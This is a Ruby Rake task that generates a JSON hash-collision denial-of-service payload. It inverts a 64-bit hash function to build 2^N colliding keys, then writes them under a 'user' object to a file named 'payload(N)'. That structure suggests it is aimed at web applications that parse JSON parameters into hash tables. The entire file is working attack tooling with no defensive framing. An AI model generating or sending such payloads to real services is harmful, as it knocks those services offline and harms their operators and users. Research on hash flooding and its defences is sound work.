require 'json'

task "create-json", :blocks do |t, args|

  module Collisions

    INV_MAGIC = 0x5f7a0ea7e59b19bd
    R = 16
    MASK64 = 0xffffffffffffffff
    DIFF = "\x00\x00\x00\x00\x00\x00\x00\x80"
    VALID = %r(\A[\[\]]*([^\[\]]+)\]*)
    PRNG = Random.new

    module_function

    def find(blocks)
      num_collisions= 1 << blocks

      in0, in1 = create_inputs(blocks)

      params = []
      num_collisions.times do |i|
        collision = ""
        blocks.times do |j|
          src = i & (1 << j) == 0 ? in0 : in1
          collision << src.slice(j * 16, 16)
        end
        collision.force_encoding(Encoding::UTF_8)
        params << collision
        #puts collision.hash
      end
      params
    end

    private; module_function

    def create_inputs(blocks)
      i = 0
      num_found = 0
      done = false
      #regx = /\0/
      in0 = ""
      in1 = ""

      until done
        begin
          b = invert64(i)
          b2 = b.dup.force_encoding(Encoding::UTF_8)
          VALID =~ b2
          #next if b2 =~ regx
          
          a = [i].pack("Q<")
          c = "".tap do |s|
            a.each_byte.each_with_index do |byte, i|
              s << (a[i].ord ^ DIFF[i % 8].ord)
            end
          end
          
          d = invert64(c.unpack("Q<")[0])
          d2 = d.dup.force_encoding(Encoding::UTF_8)
          VALID =~ d2
          #next if d2 =~ regx

          puts "i: #{i}"
          in0 << b
          in1 << d
          num_found += 1
          done = true if num_found == 2 * blocks
        rescue ArgumentError
          #OK
        ensure
          i += 1
        end
      end
      return in0, in1
    end

    def invert64(n)
      x = (n * INV_MAGIC) & MASK64
      t = x >> R
      u = (x ^ t) >> R
      v = (x ^ u) >> R
      x = x ^ v
      x = (x * INV_MAGIC) & MASK64
      [x].pack("Q<")
    end

  end

  blocks = args[:blocks].to_i
  params = Collisions.find(blocks)
  File.open("payload(#{blocks})", "wb") do |f|
    buf = "{ \"user\": { #{params.pop.to_json}: \"a\""
    params.each { |p| buf << ", #{p.to_json}: \"a\"" }
    buf << ' } }'
    f.print(buf)
  end
end

